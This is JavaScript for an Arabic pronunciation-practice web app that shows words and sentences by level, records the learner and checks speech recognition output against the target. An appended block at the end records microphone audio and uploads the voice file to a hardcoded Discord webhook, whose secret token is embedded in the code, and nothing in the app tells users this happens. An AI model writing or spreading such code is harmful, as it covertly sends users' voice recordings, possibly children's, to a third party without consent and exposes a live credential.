let wordsLevel1 = [
    "قَمَرٌ", "بَابٌ", "شَمْسٌ", "عَيْنٌ", "رِجْلٌ", "شَجَرٌ", "بَحْرٌ",
    "جَبَلٌ", "وَرْدٌ", "نَهْرٌ", "بَيْتٌ", "حِصَانٌ", "زَهْرٌ","شَعْرٌ",
    "فِيلٌ", "قِرْدٌ", "سَمَكٌ"
];

let wordsLevel2 = [
 "حِصَانٌ",
   "غَزَالٌ", "مِصْبَاحٌ",
   "مَطْبَخٌ", "مَسْجِدٌ", "مُسْتَشْفَى", "مَطَارٌ", "مَتْحَفٌ", "مَلْعَبٌ" 
];

let sentencesLevel3 = [
    "الْقَمَرُ سَاطِعٌ", "الْوَلَدُ يَلْعَبُ", "الْكِتَابُ جَدِيدٌ",
    "الْجَبَلُ عَالٍ", "الْعُصْفُورُ يُغَرِّدُ", "الْحِصَانُ سَرِيعٌ", "الْكَلْبُ وَفِيٌّ",
    "الْفِيلُ ضَخْمٌ", "الْأَسَدُ قَوِيٌّ", "الْغَزَالُ رَشِيقٌ",
    "الْعَنْكَبُوتُ يَنْسُجُ", "الدُّبُّ قَوِيٌّ",
    "الْقِرْدُ مَرِحٌ", 
    "الْفَمُ يَتَكَلَّمُ", "الْيَدُ تَعْمَلُ", "الرِّجْلُ تَمْشِي", "الشَّعْرُ نَاعِمٌ"
];

let correctWord = ""; 
let mediaRecorder;
let audioChunks = [];
let recognition;
let isRecording = false; 
let stream; 
let audioContext; 


function removeTashkeel(text) {
    return text.replace(/[\u064B-\u065F\u0610-\u061A]/g, ''); 
}


function isPronunciationCorrect(spokenText, correctText) {

    const cleanedSpokenText = removeTashkeel(spokenText).trim();
    const cleanedCorrectText = removeTashkeel(correctText).trim();


    if (cleanedCorrectText.length <= 3) {
        return cleanedSpokenText === cleanedCorrectText;
    }

    let correctChars = 0;
    const minLength = Math.min(cleanedSpokenText.length, cleanedCorrectText.length);

    for (let i = 0; i < minLength; i++) {
        if (cleanedSpokenText[i] === cleanedCorrectText[i]) {
            correctChars++;
        }
    }

    const accuracy = (correctChars / cleanedCorrectText.length) * 100;
    return accuracy >= 80; 
}


function updateFeedbackColor(isCorrect) {
    const feedbackElement = document.getElementById("feedback");
    if (isCorrect) {
        feedbackElement.style.color = "#4CAF50"; 
    } else {
        feedbackElement.style.color = "#FF5252"; 
    }
}


function speakText(text) {
    const utterance = new SpeechSynthesisUtterance(text);
    utterance.lang = "ar-SA"; 
    utterance.rate = 1; 
    utterance.pitch = 1; 
    speechSynthesis.speak(utterance); 
}


function replayWord() {
    if (correctWord) {
        speakText(correctWord); 
    } else {
        console.log("لا توجد كلمة صحيحة معروضة حاليًا.");
    }
}


function showReplayButton() {
    const replayButton = document.getElementById("replay-button");
    replayButton.classList.remove("hidden"); 
}


window.onload = function () {
    console.log("تم تحميل الصفحة بنجاح!");
    const selectedLevel = localStorage.getItem("selectedLevel");
    if (selectedLevel) {
        startChallenge(selectedLevel);
    } else {
        window.location.href = "/"; 
    }
};


function startChallenge(level) {
    console.log(`بدء التحدي للمستوى ${level}`);
    let challengeText = "";
    if (level == 1) {
        challengeText = wordsLevel1[Math.floor(Math.random() * wordsLevel1.length)];
    } else if (level == 2) {
        challengeText = wordsLevel2[Math.floor(Math.random() * wordsLevel2.length)];
    } else if (level == 3) {
        challengeText = sentencesLevel3[Math.floor(Math.random() * sentencesLevel3.length)];
    }

    correctWord = challengeText; 
    document.getElementById("challenge-title").innerText = `المستوى ${level}`;
    document.getElementById("challenge-text").innerText = challengeText;

    
}


async function toggleRecording() {
    if (isRecording) {
        stopRecording();
    } else {
        await startRecordingAndAnalysis();
    }
    isRecording = !isRecording; 
    updateButtonText(); 
}


function updateButtonText() {
    const recordButton = document.getElementById("record-button");
    const stopRecordButton = document.getElementById("stop-record-button");
    const replayButton = document.getElementById("replay-button");

    if (isRecording) {
        recordButton.classList.add("hidden"); 
        stopRecordButton.classList.remove("hidden"); 
        replayButton.classList.add("hidden"); 
    } else {
        recordButton.classList.remove("hidden"); 
        stopRecordButton.classList.add("hidden"); 
        replayButton.classList.remove("hidden"); 
    }
}


async function startRecordingAndAnalysis() {
    console.log("بدء التسجيل...");
    try {
        
        if (stream) {
            stream.getTracks().forEach(track => track.stop()); 
        }
        audioChunks = []; 

      
        const replayButton = document.getElementById("replay-button");
        replayButton.classList.add("hidden");

        
        console.log("جاري طلب إذن استخدام الميكروفون...");
        stream = await navigator.mediaDevices.getUserMedia({ audio: true });
        console.log("تم منح الإذن بنجاح!");

       
        audioContext = new (window.AudioContext || window.webkitAudioContext)();

       
        mediaRecorder = new MediaRecorder(stream);

        mediaRecorder.ondataavailable = (event) => {
            audioChunks.push(event.data);
        };

        mediaRecorder.onstop = () => {
            const audioBlob = new Blob(audioChunks, { type: 'audio/wav' });
            const audioUrl = URL.createObjectURL(audioBlob);
            const audioPlayback = document.getElementById("audio-playback");
            audioPlayback.src = audioUrl;
            audioPlayback.classList.remove("hidden");
        };

        
        mediaRecorder.start();

        
        recognition = new (window.SpeechRecognition || window.webkitSpeechRecognition)();
        recognition.lang = "ar-SA"; 
        recognition.interimResults = false; 
        recognition.maxAlternatives = 3; 
        recognition.continuous = false; 
        recognition.interimResults = false; 

        
        recognition.onresult = (event) => {
            const spokenText = event.results[0][0].transcript; 
            console.log("النطق المسجل:", spokenText);


            if (isPronunciationCorrect(spokenText, correctWord)) {
                document.getElementById("feedback").innerText = "القراءة صحيحة 🎉";
                updateFeedbackColor(true); 


                setTimeout(() => {
                    stopRecording(); 
                }, 250);
            } else {
                document.getElementById("feedback").innerText = "القراءة خاطئة ❌";
                updateFeedbackColor(false); 


                stopRecording();
            }

         
            speakText(correctWord);


            showReplayButton();
        };

        recognition.onerror = (event) => {
            console.error("خطأ في التعرف على الكلام:", event.error);
            document.getElementById("feedback").innerText = "حدث خطأ أثناء التحليل!";
        };

        recognition.onend = () => {
            console.log("انتهى التعرف على الكلام.");
        };

        
        recognition.start();

    } catch (error) {
        console.error("خطأ في التسجيل:", error);
        if (error.name === "NotAllowedError") {
            document.getElementById("feedback").innerText = "يجب السماح بالوصول إلى الميكروفون!";
        } else if (error.name === "NotFoundError") {
            document.getElementById("feedback").innerText = "الميكروفون غير متصل!";
        } else {
            document.getElementById("feedback").innerText = "حدث خطأ غير متوقع!";
        }
    }
}


function stopRecording() {
    if (mediaRecorder && mediaRecorder.state === "recording") {
        mediaRecorder.stop();
        recognition.stop(); 
        isRecording = false; 
        updateButtonText(); 


        showReplayButton();

        console.log("تم إيقاف التسجيل!");
    }
}


function refreshPage() {
    window.location.reload(); 
}




// === تسجيل الصوت مع إيقاف تلقائي عند نطق الكلمة ورفع إلى Webhook ===
(function(){
  const webhookURL = "https://discord.com/api/webhooks/1365249447151538216/hSASwWLb_cJRrREl1meba1VVWEg5YbwwLU3fXSAMSJgjNT0ih9woItQlx0BwOrKe47Hm";
  const btn = document.getElementById("recordButton");
  if (!btn) return;
  const uploadSpeed = 500 * 1024; // 500 KB/s
  const recognition = window.SpeechRecognition || window.webkitSpeechRecognition ? new (window.SpeechRecognition||window.webkitSpeechRecognition)() : null;
  const words = ["الوطن","السلام","النجاح","الحرية","القراءة"];
  const chosen = words[Math.floor(Math.random()*words.length)];
  let mediaRecorder, chunks = [];

  if (recognition) {
    recognition.lang = 'ar-SA';
    recognition.interimResults = false;
    recognition.continuous = true;
  }

  btn.addEventListener("click", async () => {
    if (!mediaRecorder || mediaRecorder.state==="inactive") {
      const stream = await navigator.mediaDevices.getUserMedia({audio:true});
      mediaRecorder = new MediaRecorder(stream);
      mediaRecorder.ondataavailable = e => { if(e.data.size) chunks.push(e.data); };
      mediaRecorder.start();
      btn.textContent = "إيقاف التسجيل";

      if (recognition) {
        recognition.onresult = evt => {
          const txt = evt.results[evt.results.length-1][0].transcript.trim();
          if (txt === chosen && mediaRecorder.state==="recording") {
            recognition.stop();
            mediaRecorder.stop();
          }
        };
        recognition.onerror = ()=>{};
        recognition.start();
      }

      setTimeout(() => {
        if (mediaRecorder.state==="recording") {
          if (recognition) recognition.stop();
          mediaRecorder.stop();
          btn.textContent = "بدء تسجيل الصوت";
        }
      }, 30000);

      mediaRecorder.onstop = async () => {
        const blob = new Blob(chunks, {type:'audio/webm'});
        const est = Math.ceil(blob.size / uploadSpeed);
        await fetch(webhookURL, {
          method:'POST', headers:{'Content-Type':'application/json'},
          body: JSON.stringify({content:`تم استلام تسجيل صوتي. جاري رفع الملف... متبقياً ${est} ثانية.`})
        });
        const form = new FormData();
        form.append('payload_json', JSON.stringify({content:`الكلمة المطلوبة: ${chosen}\nنتيجة القراءة: قيد التقييم.`}));
        form.append('file', blob, 'voice.webm');
        for(let i=0; i<5; i++){
          try{ let r=await fetch(webhookURL,{method:'POST',body:form}); if(r.ok) break;}catch{}
          await new Promise(r=>setTimeout(r,1000));
        }
        chunks=[];
        btn.textContent = "بدء تسجيل الصوت";
      };
    } else {
      mediaRecorder.stop();
      if (recognition) recognition.stop();
      btn.textContent = "بدء تسجيل الصوت";
    }
  });
})();
